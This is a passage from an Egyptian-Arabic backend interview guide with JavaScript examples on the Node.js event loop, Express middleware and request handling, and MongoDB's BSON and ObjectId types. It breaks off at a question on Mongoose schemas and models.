# 🚀 Giant Backend Interview Q&A Vault — V2
### Node.js · Express · MongoDB · Mongoose · Networking · Security
> **للـ Freshers والـ Junior Backend Developers** — مش هتلاقي أعمق من كده تحضير إنترفيو 💪
> كل سؤال فيه شرح عميق بالعامية المصرية التقنية + كود عملي. الهدف مش الحفظ — الهدف الفهم الحقيقي.

---

## ⚡ Part 1 — Node.js & Express

---

### 1. إيه هو الـ Event Loop في Node.js وإزاي بيشتغل؟

---

#### 🧠 الشرح

خليني أبدأ بسؤال: إيه اللي بيخلي Node.js مختلف عن أي Runtime تاني؟ الجواب في كلمتين: **Non-Blocking I/O**. بس عشان تفهم الجملة دي صح، لازم تفهم الـ Event Loop الأول.

تخيّل معايا إنك صاحب مطعم صغير وعندك **طباخ واحد بس** (وده هو الـ Single Thread في Node.js). الطباخ ده شاطر جداً، بس محدود — مينفعش يعمل أكتر من حاجة واحدة في نفس اللحظة بالضبط. دلوقتي عندك كلاين بيطلب ستيك — الستيك هياخد 20 دقيقة. لو الطباخ وقف مستنى الـ 20 دقيقة دي من غير ما يعمل حاجة، هيضيّع وقت كبير وباقي الكلاين هيفضلوا جعانين.

الطباخ الذكي بيعمل إيه؟ بيحط الستيك في الـ Oven ويكمل يعمل طلبات تانية. لما الـ Oven يخلص، بيطنطن له (Event)، وهو بييجي يكمل تجهيز الطبق ده.

ده بالظبط الـ **Event Loop**.

الـ Node.js بيشتغل بـ Single Thread، يعني في وقت واحد بيشغّل سطر كود واحد بس. لما بيلاقي Operation بطيئة زي قراءة ملف من الـ Hard Disk، أو بعت Request لـ Database، أو طلب من API تاني — بيديها لـ **libuv** (وهو C++ Library بيشتغل في الخلفية خارج الـ Main Thread) وبيكمل تنفيذ باقي الكود. لما الـ Operation تخلص، libuv بيحط الـ Callback function في **Callback Queue**. الـ Event Loop بيفضل يشوف باستمرار: "هل الـ Call Stack فاضي؟" — لو أيوه، بياخد الـ Callback من الـ Queue ويحطه في الـ Stack ويشغّله.

**مراحل الـ Event Loop بالترتيب:**
الـ Event Loop مش Loop واحد بسيط — هو عبارة عن عدة **Phases** بتتكرر:

1. **Timers Phase**: بيشغّل الـ Callbacks اللي جات من `setTimeout` و `setInterval` اللي وقتها خلص.
2. **I/O Callbacks Phase**: بيشغّل الـ Callbacks المتعلقة بـ I/O Operations زي قراءة الملفات.
3. **Idle / Prepare**: Internal use لـ Node.js.
4. **Poll Phase**: هو القلب — بيستنى I/O events الجديدة. لو مفيش، بيفضل هنا.
5. **Check Phase**: بيشغّل الـ Callbacks من `setImmediate()`.
6. **Close Callbacks Phase**: بيشغّل Events زي `socket.on('close', ...)`.

وفي كل فترة بين الـ Phases، بيشغّل أي Callbacks موجودة في الـ **nextTick Queue** و **Microtask Queue** (اللي فيها Promises) — وده بيديهم الأولوية الأعلى.

**ليه ده مهم للـ Backend Developer؟**

عشان لو عملت Operation بتاخد وقت طويل وهي **Synchronous** (بلوك الـ Thread)، هتوقف كل الـ Server. يعني كل الـ Users اللي بيكلموا الـ Server دهوقتي هيفضلوا مستنين! الـ Server هيتجمد. وده أخطر حاجة ممكن تعملها في Node.js.

---

#### 💻 الكود

```javascript
// ============================================================
// Demonstrating the Event Loop phases and execution order
// ============================================================

console.log("=== Script Start (Synchronous) ==="); // Runs first — on the Call Stack

// setTimeout — goes to the Timers Phase (after current cycle)
setTimeout(() => {
  console.log("4. setTimeout — Timers Phase");
}, 0); // 0ms doesn't mean "immediately" — it means "as soon as the poll phase allows"

// setImmediate — goes to the Check Phase
setImmediate(() => {
  console.log("3. setImmediate — Check Phase");
});

// process.nextTick — highest priority, runs before next Event Loop phase
process.nextTick(() => {
  console.log("2. process.nextTick — nextTick Queue (before next phase)");
});

// Resolved Promise — goes to Microtask Queue (similar priority to nextTick)
Promise.resolve().then(() => {
  console.log("2b. Promise.resolve — Microtask Queue");
});

console.log("=== Script End (Synchronous) ==="); // Runs second — still on Call Stack

// ============================================================
// Expected output:
// === Script Start (Synchronous) ===
// === Script End (Synchronous) ===
// 2. process.nextTick — nextTick Queue (before next phase)
// 2b. Promise.resolve — Microtask Queue
// 3. setImmediate — Check Phase
// 4. setTimeout — Timers Phase
// ============================================================

// ============================================================
// The most DANGEROUS mistake: Blocking the Event Loop
// ============================================================

function blockingOperation() {
  const start = Date.now();
  // Simulating a heavy synchronous computation — CPU intensive
  while (Date.now() - start < 3000) {
    // Blocking the thread for 3 seconds — ALL requests are frozen during this
  }
}

// If you call blockingOperation() inside a route handler,
// EVERY request to your server will hang for 3 seconds.
// This is why you should NEVER do CPU-heavy work on the main thread.

// The correct approach for CPU-heavy work: use Worker Threads
const { Worker, isMainThread, parentPort } = require("worker_threads");

if (isMainThread) {
  // This is the main thread — keep it free for handling requests
  const worker = new Worker(__filename); // Spin up a worker for heavy work
  worker.on("message", (result) => console.log("Worker result:", result));
  worker.on("error", (err) => console.error("Worker error:", err));
} else {
  // This code runs INSIDE the worker thread — separate from the main thread
  const result = heavyComputation(); // Safe to block here
  parentPort.postMessage(result);
}
```

**[⬆ Back to Top](#)**

---

### 2. إيه هو الـ Middleware في Express وإزاي بيشتغل بالترتيب؟

---

#### 🧠 الشرح

فكّر في الموضوع كده: إنت شغّال في مبنى Corporate كبير وعندك Security Checkpoints. لما حد يدخل المبنى، مش بيروح على طول للشخص اللي جه يقابله. هو بيمر بـ:

1. **Reception** — بتسجّل اسمه وتدي له Badge
2. **Security Scanner** — بيفتشوا شنطته
3. **Floor Guard** — بيتأكد إن الـ Badge بتاعه بيسمحله يدخل الـ Floor ده
4. **وأخيراً** — بيوصل للشخص اللي هو جاي يقابله

كل نقطة دي هي **Middleware**. والـ Request بتاع الـ Client هو "الزائر". الـ Middleware في Express هو بالضبط نفس الفكرة — كل Request بيعدي على سلسلة من Functions قبل ما يوصل للـ Route Handler الأخير.

**التعريف التقني:** الـ Middleware هو Function بتاخد ثلاث Arguments: `(req, res, next)`. بتقرأ الـ Request، ممكن تعدّله أو تضيف عليه Data، وبعدين إما:
- بتستدعي `next()` عشان تعدّي الـ Request للـ Middleware الجاي في السلسلة.
- بتبعت Response مباشرة وتوقف السلسلة (زي لما الـ Security Guard يمنع الداخل).

**أنواع الـ Middleware في Express:**

**1. Application-level Middleware:** بيتطبق على كل الـ Requests بدون استثناء.
ده زي الـ Logging أو الـ JSON Parsing — كل Request محتاجه.

**2. Router-level Middleware:** بيتطبق على Routes معينة بس. زي الـ Authentication Middleware اللي بتحطه على الـ Routes الـ Protected بس، مش على الـ `/login` أو `/register`.

**3. Error-Handling Middleware:** ليه Signature مختلفة تماماً — بيبدأ بـ `(err, req, res, next)`. Express بيعرفه من الـ 4 Parameters دول. لازم يكون **آخر** Middleware في الـ Stack.

**4. Built-in Middleware:** زي `express.json()` و `express.urlencoded()` و `express.static()`.

**5. Third-party Middleware:** زي `cors`, `helmet`, `morgan`, `express-rate-limit`.

**أهم نقطة:** الـ Order بيهم جداً! الـ Middleware بيتشغّل بالترتيب اللي أنت شيّله فيه. لو حطيت الـ Auth Middleware بعد الـ Route Handler، مش هيشتغل على الـ Route ده!

---

#### 💻 الكود

```javascript
const express = require("express");
const app = express();

// ============================================================
// 1. APPLICATION-LEVEL MIDDLEWARE — runs on EVERY request
// ============================================================

// Built-in middleware: parse JSON request bodies
// Without this, req.body will be undefined for JSON requests
app.use(express.json());

// Built-in middleware: parse URL-encoded form data (HTML forms)
app.use(express.urlencoded({ extended: true }));

// Custom logger middleware — runs on every single request
app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${req.method} ${req.url} — IP: ${req.ip}`);
  req.requestTime = timestamp; // Attach custom data to the request object
  next(); // CRITICAL: must call next() or the request will hang forever
});

// ============================================================
// 2. ROUTE-LEVEL MIDDLEWARE — runs on specific routes only
// ============================================================

// Authentication middleware — only runs on routes that include it
const requireAuth = (req, res, next) => {
  const authHeader = req.headers.authorization;

  // Check if Authorization header exists and has the right format
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    // Stop the chain here — send 401 Unauthorized response
    return res.status(401).json({
      success: false,
      error: "Authentication required. Please provide a valid Bearer token.",
    });
  }

  const token = authHeader.split(" ")[1]; // Extract the token after "Bearer "

  // In real code, you'd verify the JWT here
  // For now, a simple simulation:
  if (token === "invalid-token") {
    return res.status(401).json({ success: false, error: "Invalid token" });
  }

  req.user = { id: "123", role: "admin" }; // Attach decoded user data to req
  next(); // Token is valid — proceed to the route handler
};

// Role-based authorization middleware factory
const requireRole = (role) => (req, res, next) => {
  // This middleware runs AFTER requireAuth, so req.user is already populated
  if (!req.user || req.user.role !== role) {
    return res.status(403).json({
      success: false,
      error: `Access denied. This resource requires the '${role}' role.`,
    });
  }
  next();
};

// ============================================================
// 3. ROUTE DEFINITIONS — with middleware applied selectively
// ============================================================

// Public route — no auth needed
app.get("/health", (req, res) => {
  res.json({ status: "ok", requestTime: req.requestTime });
});

// Protected route — applies requireAuth before the handler
app.get("/profile", requireAuth, (req, res) => {
  res.json({ message: "Your profile data", user: req.user });
});

// Admin-only route — chain multiple middlewares: auth → role check → handler
app.delete("/admin/users/:id", requireAuth, requireRole("admin"), (req, res) => {
  res.json({ message: `User ${req.params.id} deleted by admin ${req.user.id}` });
});

// ============================================================
// 4. CATCH-ALL FOR 404 NOT FOUND — place before error handler
// ============================================================

app.use((req, res, next) => {
  res.status(404).json({
    success: false,
    error: `Route '${req.method} ${req.originalUrl}' not found.`,
  });
});

// ============================================================
// 5. GLOBAL ERROR-HANDLING MIDDLEWARE — MUST be last, MUST have 4 params
// ============================================================

app.use((err, req, res, next) => {
  // Log the full error stack for debugging (use a proper logger in production)
  console.error(`[UNHANDLED ERROR] ${err.stack}`);

  const statusCode = err.statusCode || 500;
  res.status(statusCode).json({
    success: false,
    error: process.env.NODE_ENV === "production" ? "Internal server error" : err.message,
  });
});

app.listen(3000, () => console.log("Server running on port 3000"));
```

**[⬆ Back to Top](#)**

---

### 3. إيه دور `next()` بالضبط؟ وإيه الفرق لو بعتّ Error فيها؟

---

#### 🧠 الشرح

الـ `next()` هي الـ "زر التالي" في الريموت. لما تعمل `next()`، بتقول لـ Express: "أنا خلصت شغلي هنا، روّح للشخص الجاي في الـ Queue."

بس الـ `next()` عندها ثلاث سلوكيات مختلفة جداً حسب اللي بتبعته فيها:

**الحالة الأولى — `next()` بدون Arguments:**
ده السلوك العادي. Express بيروح للـ Middleware التالي أو الـ Route Handler التالي في الـ Stack. المسار طبيعي ومفيش مشكلة.

**الحالة الثانية — `next('route')` (بالسلسلة route):**
ده خاص بالـ Router. بيقفز لـ Route Handler التالي اللي بيطابق نفس الـ Route Pattern، وبيتجاوز أي Middleware متبقي في الـ Handler الحالي. مش بيستخدم كتير.

**الحالة الثالثة — `next(err)` — وده الأهم:**
لما بتبعت أي حاجة في `next()` غير `'route'`، Express بيفهم إن في Error. وفوراً بيقفز على كل الـ Regular Middleware والـ Route Handlers اللي باقية ويروح على طول لـ **Error-Handling Middleware** — وهو اللي له الـ Signature المميزة بالأربع Parameters: `(err, req, res, next)`.

**ليه الفكرة دي عظيمة؟**

قبلها، كل Route Handler كان محتاج يعمل Error Handling بنفسه ويبعت الـ Response. كان الكود بيتكرر في كل مكان. مع `next(err)`، عندك **مكان واحد مركزي** للـ Error Handling — بتعدّله في مكان واحد والتغيير بيطبق على كل الـ App.

فكّر فيها زي إنك في Hospital. لو في Emergency بيحصل في أي غرفة، مش كل غرفة عندها طاقم إسعاف خاص. في **Emergency Room واحد** ومركزي، وأي حاجة طارئة بتتحول له. الـ `next(err)` هو زرار الإسعاف، والـ Error Handler هو الـ Emergency Room.

---

#### 💻 الكود

```javascript
const express = require("express");
const app = express();
app.use(express.json());

// ============================================================
// CUSTOM ERROR CLASS — makes error handling more expressive
// ============================================================

class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode  = statusCode;
    this.isOperational = true; // Distinguishes expected errors from programming bugs
    Error.captureStackTrace(this, this.constructor);
  }
}

// ============================================================
// ASYNC WRAPPER — removes the need for try/catch in every route
// ============================================================

// Without this, every async route must have its own try/catch
// With this wrapper, unhandled promise rejections automatically call next(err)
const asyncHandler = (fn) => (req, res, next) => {
  Promise.resolve(fn(req, res, next)).catch(next); // Elegant error forwarding
};

// ============================================================
// ROUTE EXAMPLES — demonstrating next() in different scenarios
// ============================================================

// Scenario 1: Normal next() — passes to the next middleware in chain
app.use("/api", (req, res, next) => {
  console.log("Middleware 1 — attaching metadata");
  req.metadata = { version: "v1", processedAt: Date.now() };
  next(); // Move to the next registered handler for /api
});

// Scenario 2: next(err) from a manual check — operational error
app.get("/api/users/:id", asyncHandler(async (req, res, next) => {
  const { id } = req.params;

  // Validate ObjectId format before hitting the database
  if (!id.match(/^[0-9a-fA-F]{24}$/)) {
    // Instead of sending res.status(400) here, we delegate to the error handler
    return next(new AppError("Invalid user ID format. Must be a 24-character hex string.", 400));
  }

  const user = await User.findById(id).lean();

  if (!user) {
    return next(new AppError(`No user found with ID: ${id}`, 404));
  }

  res.status(200).json({ success: true, data: user });
}));

// Scenario 3: next(err) from an unexpected async failure (database crash, etc.)
app.get("/api/products", asyncHandler(async (req, res) => {
  // If mongoose.find() throws (e.g., DB is down), asyncHandler catches it
  // and automatically calls next(err) — no try/catch needed here!
  const products = await Product.find({}).lean();
  res.json({ success: true, count: products.length, data: products });
}));

// ============================================================
// CENTRALIZED ERROR HANDLER — The "Emergency Room"
// ============================================================

app.use((err, req, res, next) => {
  // Log every error for monitoring and debugging
  console.error(`[${new Date().toISOString()}] ERROR on ${req.method} ${req.url}:`, err);

  // Determine the appropriate HTTP status code
  const statusCode = err.statusCode || 500;

  // For operational errors (4xx), reveal the message — it's safe and helpful
  // For server errors (5xx), hide internal details in production
  const message =
    err.isOperational ? err.message : "An unexpected server error occurred.";

  res.status(statusCode).json({
    success: false,
    error: message,
    // Only expose the stack trace during development for debugging
    ...(process.env.NODE_ENV === "development" && { stack: err.stack }),
  });
});
```

**[⬆ Back to Top](#)**

---

### 4. شرح دورة حياة الـ `req` و `res` من أول ما الـ Request يوصل لحد ما الـ Response يترجع

---

#### 🧠 الشرح

عشان تتخيّل الـ Request Lifecycle، فكّر فيه كإنه رحلة Delivery Order في شركة تجارة إلكترونية.

**الخطوة 1 — الـ Client بيبعت الـ Request:**
العميل بيضغط "اشتري" في الموقع. البراوزر بيكوّن HTTP Request وبيبعته عبر الـ Network. الـ Request ده فيه: الـ Method (POST)، الـ URL (مثلاً `/api/orders`)، الـ Headers (فيها الـ Auth Token والـ Content-Type)، والـ Body (فيها بيانات الـ Order).

**الخطوة 2 — الـ Server بيستقبل الـ Request:**
Node.js & Express بيستقبلوا الـ Raw HTTP data وبيكوّنوا منها الـ `req` Object والـ `res` Object. الـ `req` هو "صندوق" فيه كل المعلومات القادمة من الـ Client. الـ `res` هو "قلم" اللي هتكتب بيه الـ Response وتبعتها.

**الخطوة 3 — الـ Middleware Stack:**
الـ Request بيمشي خطوة خطوة عبر كل الـ Middleware اللي سجّلتها. في كل خطوة، الـ `req` ممكن يتعدّل — تتضاف عليه Data جديدة (زي `req.user` بعد الـ Auth)، أو يتفلتر، أو يتتحقق منه. ولو أي Middleware قرر إن الـ Request غلط، بيبعت Response على طول ويوقف الرحلة.

**الخطوة 4 — الـ Route Handler:**
بعد ما الـ Request يعدي كل الـ Middleware بسلام، بيوصل للـ Route Handler الخاص بيه. هنا بيحصل الـ Business Logic — استعلام الـ Database، حسابات، إلخ.

**الخطوة 5 — الـ `res` بيتبعت:**
الـ Route Handler بيستخدم الـ `res` Object عشان يبعت الـ Response. بمجرد ما `res.json()` أو `res.send()` أو `res.end()` تتنفذ، الـ Response بيترجع للـ Client والـ Lifecycle بتخلص.

**أهم Properties في الـ `req` و `res`:**

في الـ `req`:
- `req.body` — الـ Request Body (محتاج `express.json()` يشتغل)
- `req.params` — الـ URL Parameters زي `/users/:id`
- `req.query` — الـ Query String زي `?page=2&limit=10`
- `req.headers` — كل الـ HTTP Headers
- `req.method` — GET, POST, PUT, DELETE, إلخ
- `req.url` أو `req.path` — الـ URL Path
- `req.ip` — IP Address للـ Client
- `req.cookies` — الـ Cookies (لو استخدمت `cookie-parser`)

في الـ `res`:
- `res.status(code)` — بيحدد الـ HTTP Status Code
- `res.json(data)` — بيبعت JSON Response وبيحدد Content-Type تلقائياً
- `res.send(data)` — بيبعت Response (نص أو Buffer)
- `res.redirect(url)` — بيعمل Redirect
- `res.set(header, value)` — بيحدد Header في الـ Response
- `res.cookie(name, value, options)` — بيحدد Cookie

---

#### 💻 الكود

```javascript
// ============================================================
// Complete Request-Response Lifecycle Demonstration
// ============================================================

const express = require("express");
const app = express();
app.use(express.json());

// ============================================================
// Middleware 1: Global request logger — runs on every request
// ============================================================
app.use((req, res, next) => {
  // req.method, req.url, req.ip are all populated by Express from the raw HTTP request
  console.log(`→ Incoming: [${req.method}] ${req.url} from ${req.ip}`);

  // Track when the request started (for response time calculation)
  req._startTime = Date.now();

  // Hook into the response 'finish' event to log when the response was sent
  res.on("finish", () => {
    const duration = Date.now() - req._startTime;
    console.log(`← Outgoing: [${res.statusCode}] ${req.url} — took ${duration}ms`);
  });

  next();
});

// ============================================================
// Middleware 2: Auth — selectively applied to protected routes
// ============================================================
const verifyToken = (req, res, next) => {
  // Headers are case-insensitive — Express normalizes them to lowercase
  const token = req.headers["authorization"]?.replace("Bearer ", "");

  if (!token) {
    return res.status(401).json({ success: false, error: "Missing auth token" });
  }

  // Simulate token decoding
  req.user = { id: "user_abc123", name: "Ahmed", role: "admin" }; // Attaching to req
  next();
};

// ============================================================
// Full route with complete req/res lifecycle example
// ============================================================
app.get("/api/v1/users/:id/profile", verifyToken, async (req, res, next) => {
  try {
    // --- Reading from req ---
    const userId = req.params.id;                   // From URL: /users/xyz/profile
    const fields = req.query.fields?.split(",");     // From query: ?fields=name,email
    const lang   = req.headers["accept-language"];  // From headers
    const requestingUser = req.user;                 // From our custom middleware

    // Simulate DB fetch
    const profile = {
      id: userId,
      name: "Omar Hassan",
      email: "omar@example.com",
      role: "user",
      createdAt: new Date(),
    };

    // --- Writing the res ---
    res
      .status(200)                                        // Set status code
      .set("X-Request-ID", Math.random().toString(36))   // Set custom header
      .set("Cache-Control", "private, max-age=60")        // Tell browser to cache for 60s
      .json({                                            // Send JSON body (ends the lifecycle)
        success: true,
        data: profile,
        meta: {
          requestedBy: requestingUser.id,
          language: lang,
          timestamp: new Date().toISOString(),
        },
      });

    // After res.json() is called, the response is sent.
    // Any code after this RUNS but has NO EFFECT on the response.
    // Never call res.json() or res.send() more than once — it causes "Headers already sent" error

  } catch (err) {
    next(err); // Forward unexpected errors to the global error handler
  }
});

// ============================================================
// Demonstrating different res methods
// ============================================================

// Send plain text
app.get("/ping", (req, res) => res.send("pong"));

// Send with specific status and headers
app.post("/api/products", (req, res) => {
  const newProduct = { id: "prod_1", ...req.body };
  res.status(201).location(`/api/products/${newProduct.id}`).json(newProduct);
});

// Redirect
app.get("/old-route", (req, res) => res.redirect(301, "/new-route"));

// Download a file
app.get("/export/report", (req, res) => res.download("/path/to/report.pdf", "my-report.pdf"));

app.listen(3000);
```

**[⬆ Back to Top](#)**

---

### 5. إيه الفرق بين `app.use()` و `app.get()` وباقي HTTP Methods في Express؟

---

#### 🧠 الشرح

ده سؤال يبان بسيط بس فيه بعض التفاصيل اللي بتفرق في الإنترفيو.

**`app.use()`** هو الـ "Universal Catcher" — زي بوابة المبنى الرئيسية. كل حاجة بتدخل المبنى لازم تعدي منها — بغض النظر عن الـ HTTP Method (GET, POST, PUT, DELETE, حتى PATCH وHEAD). وأهم من كده، الـ Path Matching بتاعه **Prefix-based**، يعني لو قلت `app.use('/api', middleware)` — هيشتغل على `/api`، `/api/users`، `/api/products/123` — أي حاجة تبدأ بـ `/api`.

**`app.get()`, `app.post()`, `app.put()`, `app.delete()`, إلخ:** دول Route Handlers لـ HTTP Method معين بالضبط. الـ Path Matching بتاعهم **Exact-based** — `/users` مش هتطابق `/users/profile`.

**الـ Router في Express:**

Express عنده Object اسمه `Router` — بيخليك تنظّم الـ Routes في ملفات منفصلة. بدل ما يبقى عندك كل الـ Routes في `app.js`، بتعمل Router لكل Feature وبتضمّه في الـ App الرئيسية.

---

#### 💻 الكود

```javascript
// ============================================================
// app.use() vs app.get() — The Key Differences
// ============================================================

const express = require("express");
const app = express();

// --- app.use() with a path — prefix matching ---
// This middleware runs for ALL of these:
// GET    /api
// POST   /api/users
// DELETE /api/products/123
// PUT    /api/orders/456/items
app.use("/api", (req, res, next) => {
  console.log("Running for ANY request that starts with /api");
  next();
});

// --- app.get() — exact method + exact path matching ---
// This ONLY runs for: GET /api/users
// NOT for: POST /api/users  or  GET /api/users/123
app.get("/api/users", (req, res) => {
  res.json({ users: [] });
});

// ============================================================
// Express Router — organizing routes into separate modules
// ============================================================

// --- File: routes/userRoutes.js ---
const userRouter = express.Router();

// Router-level middleware — only applies to routes in THIS router
userRouter.use((req, res, next) => {
  console.log("User router middleware — runs for all /users routes");
  next();
});

userRouter.get("/",        getAllUsers);  // Matches GET    /users
userRouter.get("/:id",     getUserById); // Matches GET    /users/:id
userRouter.post("/",       createUser);  // Matches POST   /users
userRouter.put("/:id",     updateUser);  // Matches PUT    /users/:id
userRouter.delete("/:id",  deleteUser);  // Matches DELETE /users/:id

// --- File: routes/productRoutes.js ---
const productRouter = express.Router();
productRouter.get("/",    getAllProducts);
productRouter.post("/",   createProduct);
productRouter.get("/:id", getProductById);

// --- File: app.js — mounting the routers ---
app.use("/api/v1/users",    userRouter);    // All routes in userRouter are prefixed with /api/v1/users
app.use("/api/v1/products", productRouter); // All routes in productRouter get /api/v1/products prefix

// Result:
// GET  /api/v1/users         → userRouter's GET "/"
// GET  /api/v1/users/123     → userRouter's GET "/:id"
// POST /api/v1/products      → productRouter's POST "/"
```

**[⬆ Back to Top](#)**

---

## 🍃 Part 2 — MongoDB & Mongoose

---

### 6. إيه الفرق بين JSON و BSON في MongoDB؟

---

#### 🧠 الشرح

لما الناس تسمع "MongoDB"، أول حاجة بتيجي في دماغهم إنهم بيكتبوا بيانات زي JavaScript Objects — وده صح جزئياً. بس في حاجة مهمة كتير من الناس مش عارفاها: MongoDB مش بيخزّن البيانات كـ JSON على الـ Disk. بيخزّنها كـ **BSON**.

**JSON (JavaScript Object Notation):**
هو فورمات لتبادل البيانات بين الأنظمة المختلفة. هو Text-based، يعني ممكن تفتحه في أي Text Editor وتقرأه. بس ليه قيود:
- يدعم أنواع محدودة بس: String، Number، Boolean، Array، Object، Null.
- مش بيعرف يميّز بين Integer وFloat — كلهم "Number".
- مفيش Date Type — التواريخ بتتبعت كـ Strings.
- مفيش Binary Data.

**BSON (Binary JSON):**
MongoDB طوّره لحل مشاكل JSON. ده Binary Format يعني مش مقروء للإنسان مباشرة — مخصوص للـ Machines.

مزايا BSON:
- **More Types:** فيه `Date`, `ObjectId`, `Int32`, `Int64`, `Decimal128`, `Binary`, `Regex`، وغيرهم.
- **Faster to parse:** لأنه Binary، السيرفر بيقرأه ويكتبه أسرع بكتير من Text.
- **Size metadata:** كل قيمة في BSON بيسبقها نوعها وطولها، فبيقدر يقفز على الـ Field اللي عايزه بدون ما يقرأ كل حاجة.
- **Efficient for traversal:** MongoDB بيقدر يبص على الـ BSON Document مباشرة في الـ Memory بدون ما يعمل Full Parsing.

**يعني إنت كـ Developer بتشوف إيه؟**

إنت بتكتب JavaScript Objects وبتبعتها لـ Mongoose. الـ Mongoose Driver بيعمل Serialize ليهم لـ BSON قبل ما يبعتهم لـ MongoDB. لما MongoDB يرجع Data، الـ Driver بيعمل Deserialize من BSON لـ JavaScript Objects تاني. إنت مش محتاج تتعامل مع BSON مباشرة — بس لازم تعرف إنه موجود وليه أهمية.

---

#### 💻 الكود

```javascript
const mongoose = require("mongoose");

// ============================================================
// BSON Types — what MongoDB supports that pure JSON doesn't
// ============================================================

// When you write this JavaScript object and save it to MongoDB...
const document = {
  name: "Ahmed Laptop",                         // String  — same in JSON
  price: 15000,                                 // Int32   — more precise than JSON's generic Number
  discount: 0.15,                               // Double  — 64-bit float
  exactPrice: mongoose.Types.Decimal128.fromString("14999.999"), // Decimal128 — for money/precision
  _id: new mongoose.Types.ObjectId(),           // ObjectId — 12 bytes, NOT in standard JSON
  createdAt: new Date(),                        // Date    — BSON has a dedicated Date type
  isAvailable: true,                            // Boolean — same in JSON
  tags: ["electronics", "computers"],           // Array   — same in JSON
  specs: { ram: "16GB", storage: "512GB SSD" }, // Object  — same in JSON
  // null and undefined handling
  discountCode: null,                           // Null    — same in JSON
};

// ...MongoDB stores it in BSON format on disk
// ...When you retrieve it, Mongoose converts BSON back to JavaScript objects automatically

// ============================================================
// The practical impact: Type strictness in Mongoose
// ============================================================

const productSchema = new mongoose.Schema({
  price: { type: Number },   // In BSON, this becomes a Double or Int32
  createdAt: { type: Date }, // In BSON, this is a BSON Date (not a string!)
});

// --- Correct: Storing a JS Date object ---
await Product.create({ price: 100, createdAt: new Date() });
// MongoDB stores this as a proper BSON Date — can use $gt, $lt date comparisons

// --- Incorrect: Storing date as a string (common mistake) ---
await Product.create({ price: 100, createdAt: "2024-01-15" });
// MongoDB stores this as a BSON String — date comparisons will NOT work correctly!

// ============================================================
// Querying by Date (only works with actual BSON Date type)
// ============================================================

// Find products created in the last 7 days
const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
const recentProducts = await Product.find({
  createdAt: { $gte: sevenDaysAgo }, // This works ONLY because createdAt is a BSON Date
});
```

**[⬆ Back to Top](#)**

---

### 7. إيه هو الـ ObjectId في MongoDB وليه بيتولّد على الـ Client مش الـ Server؟

---

#### 🧠 الشرح

كل Document في MongoDB لازم يكون عنده `_id` فريد — ده زي رقم الهوية. لو ما حددتوش إنت، MongoDB بيولّد `ObjectId` تلقائياً.

الـ ObjectId هو **12 bytes** (بتتعرض كـ 24 Hexadecimal Characters). الـ 12 bytes دول مش عشوائية خالص — فيهم معلومات:

- **4 bytes أول:** Unix Timestamp — وقت الإنشاء بالثانية. ده بيعني كل ObjectId فيه تاريخ ووقت إنشاء الـ Document مجاناً!
- **5 bytes وسط:** Random value تم توليده عند بدء الـ Process — بيضمن الـ Uniqueness حتى على أجهزة مختلفة.
- **3 bytes آخر:** Counter تلقائي بيبدأ من رقم عشوائي ويزيد 1 مع كل Document جديد — بيضمن الـ Uniqueness حتى لو تولّد أكتر من Document في نفس الثانية.

**ليه بيتولّد على الـ Client (الـ Driver) مش على الـ Server (MongoDB)؟**

ده سؤال عبقري وجوابه يتعلق بالـ Performance والـ Distributed Systems:

1. **يتجنب الـ Round Trip:** لو الـ Server هو المسؤول عن توليد الـ ID، الـ Client هيبعت الـ Document، يستنى الـ Server يولّد الـ ID، يرد بيه، وبعدين يبعته للـ Database. دي خطوة زيادة مش محتاجها.

2. **الـ Application يعرف الـ ID قبل الـ Save:** ده مفيد جداً! تخيّل إنك بتعمل Document جديد وعايز تعمل Reference ليه في Document تاني في نفس الـ Transaction. لو ID بيتولّد بعد الـ Save، مش هتعرف ID الأول قبل ما تعمل Save الأول.

3. **يدعم الـ Offline و Distributed Operations:** حتى لو الـ Connection بالـ Database وقع مؤقتاً، الـ Client يقدر يكوّن الـ Document كامل بـ ID وينتظر لحد ما الـ Connection يرجع. في MongoDB Atlas Clusters وغيرها، أكتر من Driver ممكن يولّد IDs في نفس الوقت من غير ما يكلّموا بعض.

---

#### 💻 الكود

```javascript
const mongoose = require("mongoose");
const { ObjectId } = mongoose.Types;

// ============================================================
// Understanding ObjectId structure
// ============================================================

const id = new ObjectId(); // Generates a new ObjectId on the client side

console.log(id.toString());         // "64f1a2b3c4d5e6f7a8b9c0d1" — 24 hex chars
console.log(id.toHexString());      // Same as toString()
console.log(id.getTimestamp());     // Returns a JavaScript Date object — when was this created?
console.log(id.id);                 // The raw 12-byte Buffer — low-level representation

// Practical: Extract creation timestamp from an existing ObjectId
function getDocumentCreationDate(objectId) {
  return new ObjectId(objectId).getTimestamp();
}
console.log(getDocumentCreationDate("64f1a2b3c4d5e6f7a8b9c0d1")); // Returns Date object

// ============================================================
// The benefit: knowing the ID before saving to the database
// ============================================================

async function createOrderWithItems(userId, cartItems) {
  // Generate the order ID BEFORE saving — we can use it in the items
  const orderId = new ObjectId();

  // Create the order and its line items with consistent references
  const [order, ...items] = await Promise.all([
    Order.create({
      _id: orderId,                    // Use our pre-generated ID
      userId,
      status: "pending",
      createdAt: orderId.getTimestamp(), // Reuse the built-in timestamp
    }),
    // All items can reference the order ID we already know
    ...cartItems.map((item) =>
      OrderItem.create({ orderId, productId: item.productId, quantity: item.quantity })
    ),
  ]);
  // Notice: no sequential saves — everything ran in parallel because we knew orderId upfront!
  return { order, items };
}

// ============================================================
// Common pitfall: comparing ObjectIds
// ============================================================

const id1 = new ObjectId("64f1a2b3c4d5e6f7a8b9c0d1");
const id2 = new ObjectId("64f1a2b3c4d5e6f7a8b9c0d1");

// WRONG: This compares object references, not values — always false for different instances
console.log(id1 === id2); // false — different object references in memory

// CORRECT: Use .equals() for ObjectId comparison
console.log(id1.equals(id2)); // true — compares the actual 12-byte value

// ALSO CORRECT: Compare as strings
console.log(id1.toString() === id2.toString()); // true

// In Mongoose queries, you can pass strings — Mongoose auto-converts to ObjectId
const user = await User.findById("64f1a2b3c4d5e6f7a8b9c0d1"); // String works fine
const user2 = await User.findById(id1);                         // ObjectId instance also works
```

**[⬆ Back to Top](#)**

---

### 8. إيه الفرق بين الـ Schema والـ Model في Mongoose وإزاي بيتعاملوا مع بعض؟

---

#### 🧠 الشرح

الفرق بين الـ Schema والـ Model هو نفس الفرق بين **التصميم المعماري للبيت** و**البيت نفسه**.

